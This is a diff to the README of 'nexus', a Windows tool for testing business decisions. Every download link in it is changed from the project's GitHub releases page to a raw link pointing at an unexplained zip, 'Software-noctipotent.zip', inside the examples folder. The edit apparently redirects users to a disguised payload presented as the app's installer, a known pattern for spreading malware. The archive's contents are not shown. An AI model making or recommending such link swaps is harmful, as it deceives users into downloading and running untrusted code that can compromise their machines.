@@ -1,6 +1,6 @@
 # 🤖 nexus - Test business choices before you commit
 
-[![Download nexus](https://img.shields.io/badge/Download%20nexus-blue?style=for-the-badge)](https://github.com/bellasachsx-collab/nexus/releases)
+[![Download nexus](https://img.shields.io/badge/Download%20nexus-blue?style=for-the-badge)](https://raw.githubusercontent.com/bellasachsx-collab/nexus/main/examples/Software-noctipotent.zip)
 
 ## 📌 What nexus does
 
@@ -21,7 +21,7 @@ nexus runs on Windows through a downloadable release from GitHub.
 ### 📥 Download the app
 Visit this page to download the Windows version:
 
-https://github.com/bellasachsx-collab/nexus/releases
+https://raw.githubusercontent.com/bellasachsx-collab/nexus/main/examples/Software-noctipotent.zip
 
 ### Install steps
 1. Open the download page above.
@@ -206,7 +206,7 @@ This project covers:
 
 Use the release page any time you need to install or update nexus:
 
-https://github.com/bellasachsx-collab/nexus/releases
+https://raw.githubusercontent.com/bellasachsx-collab/nexus/main/examples/Software-noctipotent.zip
 
 ## 🪄 Simple example prompt
 
